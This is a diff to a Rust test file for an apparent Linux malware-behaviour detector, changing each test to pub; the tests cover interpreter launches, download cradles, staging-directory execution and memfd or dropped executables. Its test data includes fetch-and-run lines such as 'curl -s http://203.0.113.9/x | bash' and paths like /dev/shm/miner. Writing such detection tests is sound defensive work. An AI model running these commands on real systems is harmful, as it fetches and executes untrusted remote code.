@@ -2,7 +2,7 @@
 use super::support::*;
 
 #[test]
-fn a_plain_exec_is_info_and_an_interpreter_is_low_with_its_technique() {
+pub fn a_plain_exec_is_info_and_an_interpreter_is_low_with_its_technique() {
     let out = run(vec![
         exec(1, "/bin/ls", &["ls", "-l"]),
         exec(1, "/usr/bin/python3.12", &["python3.12", "-c", "pass"]),
@@ -22,7 +22,7 @@ fn a_plain_exec_is_info_and_an_interpreter_is_low_with_its_technique() {
 }
 
 #[test]
-fn shells_and_more_interpreters_are_recognised_by_name_busybox_applet_and_hashbang() {
+pub fn shells_and_more_interpreters_are_recognised_by_name_busybox_applet_and_hashbang() {
     for (path, argv) in [
         ("/bin/ash", vec!["ash"]),
         ("/usr/bin/ksh", vec!["ksh"]),
@@ -51,13 +51,13 @@ fn shells_and_more_interpreters_are_recognised_by_name_busybox_applet_and_hashba
 }
 
 #[test]
-fn a_failed_exec_is_one_tier_down() {
+pub fn a_failed_exec_is_one_tier_down() {
     let out = run(vec![failed_exec(1, "/bin/sh", &["sh"])]);
     assert_eq!(tier(&out, "process.interpreter").as_deref(), Some("info"));
 }
 
 #[test]
-fn download_cradle_needs_a_fetcher_whose_output_runs() {
+pub fn download_cradle_needs_a_fetcher_whose_output_runs() {
     for script in [
         "wget -q -O - http://203.0.113.9/d.sh | sh",
         "curl -s http://203.0.113.9/x | bash",
@@ -81,7 +81,7 @@ fn download_cradle_needs_a_fetcher_whose_output_runs() {
 }
 
 #[test]
-fn chmod_plus_x_in_a_staging_directory_is_medium_and_elsewhere_nothing() {
+pub fn chmod_plus_x_in_a_staging_directory_is_medium_and_elsewhere_nothing() {
     for path in [
         "/tmp/payload",
         "/var/tmp/x",
@@ -106,7 +106,7 @@ fn chmod_plus_x_in_a_staging_directory_is_medium_and_elsewhere_nothing() {
 }
 
 #[test]
-fn exec_from_a_staging_or_hidden_directory_is_medium_except_the_sample() {
+pub fn exec_from_a_staging_or_hidden_directory_is_medium_except_the_sample() {
     let out = run(vec![exec(1, "/dev/shm/miner", &["miner"])]);
     let row = rows(&out, "execution.temp_exec");
     assert_eq!(row.len(), 1);
@@ -123,7 +123,7 @@ fn exec_from_a_staging_or_hidden_directory_is_medium_except_the_sample() {
 }
 
 #[test]
-fn memfd_exec_by_fd_path_and_by_empty_path_and_a_plain_memfd_is_low() {
+pub fn memfd_exec_by_fd_path_and_by_empty_path_and_a_plain_memfd_is_low() {
     let create = || {
         let row = sys(1, 319, "memfd_create", [0, 1, 0, 0, 0, 0], 5);
         with_path(row, "arg0.name", "x")
@@ -161,7 +161,7 @@ fn memfd_exec_by_fd_path_and_by_empty_path_and_a_plain_memfd_is_low() {
 }
 
 #[test]
-fn an_exec_of_a_file_with_no_name_left_is_fileless() {
+pub fn an_exec_of_a_file_with_no_name_left_is_fileless() {
     let unnamed = with_notes(exec(1, "/tmp/gone", &["gone"]), vec![file_id(6, 77, 0)]);
     let out = run(vec![unnamed]);
     assert_eq!(
@@ -173,7 +173,7 @@ fn an_exec_of_a_file_with_no_name_left_is_fileless() {
 }
 
 #[test]
-fn a_file_the_run_wrote_and_then_ran_is_a_dropped_exec_by_identity_or_path() {
+pub fn a_file_the_run_wrote_and_then_ran_is_a_dropped_exec_by_identity_or_path() {
     let by_path = run(vec![
         open_write(1, "/tmp/kinsing", 3),
         write(1, 3, b"\x7fELF"),
@@ -201,7 +201,7 @@ fn a_file_the_run_wrote_and_then_ran_is_a_dropped_exec_by_identity_or_path() {
 }
 
 #[test]
-fn a_compiled_program_is_compile_then_run_not_a_dropper() {
+pub fn a_compiled_program_is_compile_then_run_not_a_dropper() {
     let out = run(vec![
         exec(1, "/usr/bin/gcc", &["gcc", "x.c", "-o", "/tmp/x"]),
         open_write(1, "/tmp/x", 3),
@@ -215,7 +215,7 @@ fn a_compiled_program_is_compile_then_run_not_a_dropper() {
 }
 
 #[test]
-fn an_elf_written_into_a_memfd_and_a_dropped_library_are_medium() {
+pub fn an_elf_written_into_a_memfd_and_a_dropped_library_are_medium() {
     let out = run(vec![
         with_path(
             sys(1, 319, "memfd_create", [0, 0, 0, 0, 0, 0], 4),
@@ -248,7 +248,7 @@ fn an_elf_written_into_a_memfd_and_a_dropped_library_are_medium() {
 }
 
 #[test]
-fn rules_name_a_sample_only_when_not_the_launched_program() {
+pub fn rules_name_a_sample_only_when_not_the_launched_program() {
     let out = run(vec![call(1, 0, "read", 0)]);
     assert!(out.rows.is_empty());
 }
